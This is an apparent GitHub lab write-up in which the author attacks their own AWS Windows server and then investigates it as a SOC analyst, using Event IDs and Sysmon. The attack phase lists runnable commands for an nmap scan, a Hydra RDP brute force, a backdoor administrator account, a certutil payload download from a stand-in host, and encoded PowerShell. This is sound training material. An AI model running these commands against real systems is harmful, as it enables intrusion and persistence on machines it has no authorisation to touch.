# 🛡️ Practical SOC Workflows Using Windows Event and Sysmon Logs

## 📘 Overview
This project simulates a realistic security incident on a Windows system and demonstrates how a SOC (Security Operations Center) analyst might investigate and respond using Windows Event Logs and Sysmon telemetry. The lab follows the NIST SP 800-61 framework for incident response, emphasising hands-on detection, containment, and remediation.

This project serves both as a learning resource and as a proof of concept to reinforce Windows forensic workflows, enhance detection engineering intuition, and build investigative muscle memory for real-world SOC environments.

- **Disclaimer**: The EC2 instances were terminated post project completion, and therefore majority of IP's have not been redacted. These instances no longer exist.

## 🎯 Project Objectives
- To simulate attacker behavior including enumeration, reconnaissance, brute-force (dictionary-based) authentication attempts, and post-compromise actions such as privilege escalation and persistence.
- To conduct a structured SOC-style investigation using built-in tools (Event Viewer, PowerShell) and third-party utilities (Sysmon), while practicing detection logic, log correlation, and incident response techniques.

## Tools
- AWS EC2 instances (windows & ubuntu)
- [nmap](https://nmap.org/)
- [Hydra](https://www.kali.org/tools/hydra/)
- Windows Event Viewer
- [Sysmon](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)

## 📌 Project Phases
| Phase | Title | Description |
|-------|-------|-------------|
| 1     | Pre attack activities | Carry out enumeration and reconnaissance on the vulnerable server |
| 2     | Brute-force (dict attack) | The attacker brute forces authentication into the server via a dictionary attack | 
| 3     | Post-compromise | The attackers post compromise actions such as privilege escalation and persistence |
| 4     | SOC Investigation | SOC team is alerted of the security events and begins investigations following NIST SP 800-61 framework for Incident Response |
| 5     | MITRE ATTACK | Correlate the security events to MITRE ATTACK tools & techniques |
| 6     | Lessons learned | Project overview and summary of findings |

### 1. Pre attack activities
The pre attack activities are simulated by me to better understand the tools, techniques, and through processes behind attacker behaviours for enumeration and reconnaissance. I begin by performing an `nmap` scan on the public IP address of the target server.

```
sudo nmap -sS -Pn 16.170.231.38
```

- `-sS`: SYN scan (stealth scan)
- `-Pn`: Skips host discovery (assumes host is up)

![image](https://github.com/user-attachments/assets/f489032b-e585-41cf-a6fa-7a311ce935fc)

The attacker notes that port 3389 (RDP) is open on service: `ms-wbs-server`. 

### 2. Brute-force attack (dictionary attack)
The attacker begins a dictionary attack using `Hydra`, on common username credentials such as `itadmin`. They create a `password.txt` file containing common and weak passwords to begin their attack.

![image](https://github.com/user-attachments/assets/8d291ff1-beac-474e-bdf9-bf463967b840)

With the first password list ready, they run Hydra against the public IP address of the server.

```
hydra -t 1 -W 3 -V -l itadmin -P passwords.txt rdp://16.170.231.38
```

![image](https://github.com/user-attachments/assets/72b187f8-094e-4f00-80d1-72974e738c27)

This reveals a successful authentication via password `Summer2025` which the attacker can then use for successful authentication via RDP to the remote server.

### 3. Post-compromise activities
The attacker then accesses the remote machine via RDP using the details discovered through this enumeration and reconaissance. Once inside, the attacker elevates a new account and adds it so a security-enabled group `Administrators`. The new user `svc_task` is a common naming convention to evade detection, mimicking real windows service accounts.

```
PS C:\Windows\system32> net user svc_task notevil123! /add
The command completed successfully.

PS C:\Windows\system32> net localgroup administrators svc_task /add
The command completed successfully.

PS C:\Windows\system32>
```

The attacker then laterally moves to this new account `svc_task` and performs two actions in PowerShell.

```
certutil.exe -urlcache -split -f http://example.com/payload.txt C:\Temp\payload.txt
```

- `certutil.exe` is a built-in windows binary and is often abused by attackers to download files. Its commonly whitelisted and can help attackers to evade suspicions.
- The command parameters attempt to fetch a remote file from the example url and save it locally as `payload.txt`

```
powershell -enc UwB0AGEAcgB0AC0AUABvAHMAZQBzAHMAIABjAGEAbABjAC4AZQB4AGUA
```

- This is Base64-Encoded Powershell with Obfuscation. The `-enc` flag tells PowerShell to interpret the argument as a base64-encoded command.
- The base64 string decodes to: `Start-Process calc.exe` (CyberChef was used here). This example is harmless - but the tactic realistic. Attackers use this method to hide dangerous payloads.

### 4. SOC Investigation (NIST SP 800-61)
In this scenario, the SOC team have had numerous alerts raised on their EDR and SIEM platform, which contained the following alert messages:
- Number of invalid logins for account `itadmin` has exceeded threshold of 3 within 10 minutes.
- New user account has been created and added to a security-enabled group
- Malicious PowerShell code detected on host: `EC2AMAZ-NILIHU8`

### 4.1 Preparation
This phase of the framework comes before an incident, and involves log management, playbooks, detection rules such as in EDR/SIEM platforms, asset inventories, and user training. The goal of this stage overall is to ensure you are ready before a security incident.

### 4.2 Detection & Analysis
The alerts from this incident have came from the organisations SIEM (Splunk) and EDR (Microsoft XDR) platforms. However, this can also involve manual user escalations or threat intel. In this stage, triaging the alert helps to confirm if it is real by investigating the alert sources in greater detail. In this project, the SOC L1 assigns himself ownership of the cases, and begins the investigation. The SIEM alerts have revealed IOCs (indicators of compromise) such as host: `EC2AMAZ-NILIHU8` and user: `itadmin`. The L1 then pivots into this machine and opens up Windows Event Viewer to look deeper.

In `Event Viewer` -> `Windows Logs` -> `Security` the L1 filters on Event ID `4625`: failed logins. 10 login attempts were made at around `12:37 PM`. By going through these events individually, we see that the account name `itadmin` has been under a brute-force attack. The IP address 16.16.66.207 is an external/unknown IP address. The failure reason explains that the username of password was incorrect. 

![image](https://github.com/user-attachments/assets/fcd9b2bd-e695-4594-8e67-59113a04af3b)

![image](https://github.com/user-attachments/assets/bb4a9e38-8ac2-4eab-b99d-07c59513f34f)

The L1 then changes his search towards successful logins: Event ID `4624` and creates a custom XML filter on the target username identified `itadmin`.

![image](https://github.com/user-attachments/assets/a58d4f74-e558-4da9-a5fd-f9f73b7b2c69)

The results reveal that at `12:49:49` this user was successfully accessed by the malicious IP address. We know from the SIEM alerts that a new user has been created and added to a security-enabled group. Therefore the following searches investigate this with the relevant Event IDs. Filtering now on Event ID `4720`: New user account was created - We discover that itadmin has created a new user account called `svc_task`: at `1:11:08 PM`. The next Event ID `4732` reveals that the attacker then added this account to `Administrators`.

![image](https://github.com/user-attachments/assets/0d53525a-22b6-4e72-ab6f-0108f1e30a79)

In the `sysmon` logs in Event Viewer, another custom XML filter was applied, looking directly at the suspicious new user, and `EventID=1` which covers `Process creation`.

![image](https://github.com/user-attachments/assets/2db2a8e1-67b5-4d8d-a560-72bc40bd3d48)

Within the event results, we discover that the user ran malicious encoded PowerShell code.

![image](https://github.com/user-attachments/assets/3e75533a-edbb-4f6c-aa09-e79649589ac4)

```
CommandLine: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -enc UwB0AGEAcgB0AC0AUABvAHMAZQBzAHMAIABjAGEAbABjAC4AZQB4AGUA
```

I then checked the `PSReadLine` file for the suspicious user `svc_task`, found here:

```
C:\Users\svc_task\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
```

![image](https://github.com/user-attachments/assets/1c127e03-48e0-401c-9845-e148a6d0db7e)

This is when I discovered more malicious PowerShell code that was not picked up in Sysmon. This was a `certutil.exe` abuse attempt to fetch a malicious payload from an external website.
